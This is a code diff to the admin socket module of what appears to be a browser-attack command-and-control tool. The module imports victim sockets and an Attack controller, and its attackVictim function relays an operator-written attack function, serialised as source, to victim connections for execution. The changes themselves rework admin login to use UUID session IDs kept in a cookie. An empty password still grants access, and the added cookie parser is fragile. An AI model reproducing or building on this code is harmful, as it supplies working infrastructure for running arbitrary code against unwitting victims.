@@ -1,6 +1,9 @@
 const victimSockets = require('../victim/sockets')
 const server = require('../../server')
 const Attack = require('../../db/controllers/attack')
+const uuidv4 = require('uuid/v4')
+
+const authorizedAdminSessionIDS = {}
 
 module.exports.configure = function (io) {
   module.exports.emit = function (eventName, data) {
@@ -8,9 +11,10 @@ module.exports.configure = function (io) {
   }
 
   io.on('connection', function (socket) {
-    console.log('new connection on admin interface', socket.handshake.session)
-    if(process.env.PASSWD === '' || socket.handshake.session.authorized){
-      login(socket)
+    console.log('new connection on admin interface')
+    let sessID = findCookieVal(socket.request.headers.cookie, 'admin-sess')
+    if(process.env.ADMIN_APP_PASSWD === '' || authorizedAdminSessionIDS[sessID]){
+      login(socket, sessID)
     }else{
       socket.on('login', function(password){
         testLogin(password, socket)
@@ -39,7 +43,7 @@ function deleteAttack(attackId){
   })
 }
 
-function login(socket){
+function login(socket, sessID){
   socket.join('admins')
 
   socket.on('attackVictim', attackVictim)
@@ -48,14 +52,14 @@ function login(socket){
   socket.on('getUsers', getUsers)
   socket.on('saveAttack', saveAttack)
   socket.on('deleteAttack', deleteAttack)
-  socket.emit('authorized', true)
+  socket.emit('authorized', sessID)
 }
 
 function testLogin(password, socket){
   if(password === process.env.ADMIN_APP_PASSWD){
-    socket.handshake.session.authorized = true
-    socket.handshake.session.save()
-    login(socket)
+    let sessID = uuidv4()
+    authorizedAdminSessionIDS[sessID] = true
+    login(socket, sessID)
   }else{
     socket.emit('login-required')
   }
@@ -83,6 +87,17 @@ function attackVictim(data) {
     func: `var attack = ${data.attack.toString()}`,
     params: data.params
   })
+}
+
+function findCookieVal(cookieStr='', cookieName){
+  let val = ''
+  cookieStr.split(';').forEach((cookie)=>{
+    let [k,v] = cookie.split('=')
+    if(k === cookieName){
+      val = v
+    }
+  })
+  return val
 }
 
 module.exports.emit = function(){
